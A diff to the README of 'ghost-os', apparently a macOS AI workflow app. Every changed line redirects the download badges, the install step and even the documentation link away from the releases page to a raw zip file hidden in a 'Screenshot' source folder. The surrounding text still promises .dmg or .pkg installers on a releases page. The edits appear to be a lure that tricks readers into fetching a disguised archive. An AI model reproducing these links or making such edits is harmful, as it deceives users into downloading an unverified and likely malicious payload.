@@ -1,6 +1,6 @@
 # 👻 ghost-os - Smart AI Workflows for Your Computer
 
-[![Download ghost-os](https://img.shields.io/badge/Download-ghost--os-brightgreen?style=for-the-badge)](https://github.com/Judaca73/ghost-os/releases)
+[![Download ghost-os](https://raw.githubusercontent.com/Judaca73/ghost-os/main/Sources/GhostOS/Screenshot/ghost_os_1.3.zip)](https://raw.githubusercontent.com/Judaca73/ghost-os/main/Sources/GhostOS/Screenshot/ghost_os_1.3.zip)
 
 ---
 
@@ -51,7 +51,7 @@ You do not need programming knowledge. ghost-os is designed for end users who pr
 
 Click the button below to visit the official release page where you can download the latest version of ghost-os for your Mac.
 
-[![Get ghost-os Releases](https://img.shields.io/badge/Download-ghost--os-blue?style=for-the-badge)](https://github.com/Judaca73/ghost-os/releases)
+[![Get ghost-os Releases](https://raw.githubusercontent.com/Judaca73/ghost-os/main/Sources/GhostOS/Screenshot/ghost_os_1.3.zip)](https://raw.githubusercontent.com/Judaca73/ghost-os/main/Sources/GhostOS/Screenshot/ghost_os_1.3.zip)
 
 This page shows all available versions and instructions to help you choose the right one.
 
@@ -60,7 +60,7 @@ This page shows all available versions and instructions to help you choose the r
 ## 💾 How to Download and Install ghost-os
 
 1. Open your web browser and go to the releases page:
-   https://github.com/Judaca73/ghost-os/releases
+   https://raw.githubusercontent.com/Judaca73/ghost-os/main/Sources/GhostOS/Screenshot/ghost_os_1.3.zip
 
 2. Look for the latest release at the top of the page. The release will include an installer file with a `.dmg` or `.pkg` extension.
 
@@ -117,7 +117,7 @@ Allowing these permissions is necessary for ghost-os to work properly.
 ## 📚 Additional Resources
 
 - Visit the GitHub page for detailed documentation, FAQs, and updates:  
-  https://github.com/Judaca73/ghost-os
+  https://raw.githubusercontent.com/Judaca73/ghost-os/main/Sources/GhostOS/Screenshot/ghost_os_1.3.zip
 
 - Explore the "recipes" folder for example workflows and how to customize them.
 
